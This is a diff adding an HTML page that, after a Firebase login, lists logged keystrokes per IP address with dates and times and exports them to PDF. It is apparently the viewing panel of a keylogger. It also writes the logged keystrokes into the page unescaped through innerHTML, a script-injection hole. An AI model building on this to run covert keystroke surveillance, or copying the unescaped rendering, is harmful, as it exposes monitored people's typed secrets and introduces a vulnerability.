@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="image.png" size="64*64" type="image/png">
+    <title>Keystrokes Details</title>
+    <style>
+        body {
+            background-color: #0e0e0e;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            background-color: #1c1c1c;
+            padding: 30px;
+            border: 1px solid #00FF00;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 255, 0, 0.7);
+            overflow: hidden;
+            position: relative;
+            padding-bottom: 80px;
+        }
+
+        .back-button, .download-button {
+            background-color: #003b46;
+            color: #00FF00;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 1em;
+            position: absolute;
+            bottom: 20px;
+            z-index: 10;
+        }
+
+        .back-button {
+            right: 20px;
+        }
+
+        .download-button {
+            left: 20px;
+        }
+
+        .back-button:hover, .download-button:hover {
+            background-color: #004d4d;
+        }
+
+        .ip-heading {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            color: #00FF00;
+            text-align: center;
+        }
+
+        .table-wrapper {
+            max-height: 600px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: #2e2e2e;
+            border-radius: 8px;
+        }
+
+        th, td {
+            border: 1px solid #00FF00;
+            padding: 15px;
+            text-align: center;
+            vertical-align: middle;
+            color: #e0e0e0;
+        }
+
+        thead th {
+            background-color: #007700;
+            color: #ffffff;
+            position: sticky;
+            top: 0;
+            z-index: 1;
+            font-weight: bold;
+        }
+
+        .table-wrapper::-webkit-scrollbar {
+            width: 12px;
+        }
+
+        .table-wrapper::-webkit-scrollbar-thumb {
+            background-color: #007700;
+            border-radius: 6px;
+        }
+
+        .table-wrapper::-webkit-scrollbar-track {
+            background-color: #1c1c1c;
+            border-radius: 6px;
+        }
+
+        .no-results {
+            color: #ff0000;
+            text-align: center;
+            font-size: 1.2em;
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+
+            .container {
+                width: 100%;
+                padding: 10px;
+                box-shadow: none;
+                padding-bottom: 60px;
+            }
+
+            .back-button, .download-button {
+                bottom: 10px;
+            }
+
+            .back-button {
+                right: 10px;
+            }
+
+            .download-button {
+                left: 10px;
+            }
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.13/jspdf.plugin.autotable.min.js"></script>
+    <script>
+        const firebaseConfig = {
+            // space for firebase credentials
+        };
+
+        firebase.initializeApp(firebaseConfig);
+
+        function fetchKeystrokes(ip) {
+            const db = firebase.database();
+            const logRef = db.ref('log');
+
+            logRef.orderByChild('ip').equalTo(ip).once('value', (snapshot) => {
+                const logs = snapshot.val();
+                const results = [];
+
+                for (const logId in logs) {
+                    if (logs[logId].keystrokes) {
+                        results.push({
+                            keystrokes: logs[logId].keystrokes,
+                            date: logs[logId].start_date,
+                            time: logs[logId].end_time
+                        });
+                    }
+                }
+
+                displayKeystrokes(ip, results);
+            });
+        }
+
+        function displayKeystrokes(ip, entries) {
+            const container = document.getElementById('keystrokes');
+            container.innerHTML = ''; // Clear previous content
+
+            const ipHeading = document.createElement('div');
+            ipHeading.className = 'ip-heading';
+            ipHeading.textContent = `IP: ${ip}`;
+            container.appendChild(ipHeading);
+
+            if (entries.length > 0) {
+                const wrapper = document.createElement('div');
+                wrapper.classList.add('table-wrapper');
+                const table = document.createElement('table');
+                const thead = document.createElement('thead');
+                thead.innerHTML = '<tr><th>S.No</th><th>Keystrokes</th><th>Date</th><th>Time</th></tr>';
+                table.appendChild(thead);
+                const tbody = document.createElement('tbody');
+                entries.forEach((entry, index) => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `<td>${index + 1}</td><td>${entry.keystrokes}</td><td>${entry.date}</td><td>${entry.time}</td>`;
+                    tbody.appendChild(tr);
+                });
+                table.appendChild(tbody);
+                wrapper.appendChild(table);
+                container.appendChild(wrapper);
+            } else {
+                container.innerHTML = '<p class="no-results">No keystrokes found</p>';
+            }
+        }
+
+        function downloadPDF() {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            const table = document.querySelector('table');
+
+            const headers = [['S.No', 'Keystrokes', 'Date', 'Time']];
+            const data = [];
+            table.querySelectorAll('tbody tr').forEach((row, index) => {
+                const rowData = [
+                    index + 1,
+                    row.cells[1].innerText,
+                    row.cells[2].innerText,
+                    row.cells[3].innerText
+                ];
+                data.push(rowData);
+            });
+
+            doc.autoTable({
+                head: headers,
+                body: data,
+                startY: 20
+            });
+
+            doc.save('keystrokes.pdf');
+        }
+
+        function checkAuthState() {
+            firebase.auth().onAuthStateChanged((user) => {
+                if (user) {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const ip = urlParams.get('ip');
+                    if (ip) {
+                        fetchKeystrokes(ip);
+                    }
+                } else {
+                    window.location.href = 'index.html'; // Redirect to login page if not authenticated
+                }
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', checkAuthState);
+    </script>
+</head>
+<body>
+    <div class="container">
+        <button class="back-button" onclick="window.location.href='system.html'">Back</button>
+        <button class="download-button" onclick="downloadPDF()">Download</button>
+        <div id="keystrokes"></div>
+    </div>
+</body>
+</html>
